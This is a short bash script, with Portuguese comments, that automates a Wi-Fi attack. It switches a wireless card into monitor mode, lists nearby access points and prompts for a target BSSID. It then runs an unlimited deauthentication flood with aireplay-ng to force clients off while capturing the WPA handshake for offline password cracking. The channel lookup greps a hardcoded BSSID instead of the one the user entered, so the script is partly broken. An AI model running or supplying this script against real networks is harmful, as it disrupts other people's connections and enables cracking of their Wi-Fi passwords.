#!/bin/bash
# testando



rm -rf saida.status*
echo "Vamos as informações iniciais..."
read -p "Informe o nome do seu dispositivo de rede WI-FI " dispositivo
echo "Colocando dispositivo em modo promiscuo.............." 
airmon-ng start $dispositivo
sleep 10
echo 'Modo promiscuo ativo <:-] '
sleep 5
clear

echo 'Agora vamos ao que interessa \ô/'

echo 'tecle enter para começar a captura dos BSSIDs e lempre quando axar que ta bom tecle ctrl c blz?....' pause

airodump-ng $dispositivo\mon --write saida.status


killall airodump-ng

echo "Pronto ja capturamos os BSSIDs e são os listados abaixo.. escolha um e seja feliz"

echo "$(cat saida.status-01.csv | cut -d "," -f 1)"


echo ""
read -p "Informe um BSSID que se repita nos 2 campos... é só copiar e colar jovem : " bssid
sleep 5
clear
echo "Agora vamaos esperar aquele aperto de mão maravilhooooso...."

canal=$(cat saida.status-01.csv | grep -E "14:D6:4D:80:46:10" | cut -d "," -f 4 | egrep -v "-")

aireplay-ng -0 0 -a $bssid $dispositivo\mon &

airodump-ng -c $canal --bssid $bssid -w ~/SANTANGELI $dispositivo\mon






















